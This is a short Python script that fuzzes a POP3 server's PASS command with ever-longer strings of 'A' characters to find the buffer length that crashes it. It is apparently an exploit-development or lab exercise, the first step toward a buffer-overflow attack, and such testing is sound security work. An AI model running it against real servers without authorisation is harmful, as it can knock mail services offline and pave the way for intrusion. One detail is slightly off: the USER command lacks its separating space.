#!/usr/bin/python

import socket
import sys

TARGET = "xxxxxxxx"
PORT = 110

buffer = "A" * 100

send = lambda s,cmd,payload : s.send((cmd + payload + '\r\n'))

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, PORT))
        s.recv(1024)
        send(s, 'USER', 'test')
        s.recv(1024)
        send(s, 'PASS ', buffer)
        s.recv(1024)
        send(s, 'QUIT', ' ')
        s.close()
        buffer = buffer + "A" * 100
        print(len(buffer))
    except Exception as e:
        print(e)
        print("Fuzzing crashed at: {}".format(len(buffer)))
        sys.exit()
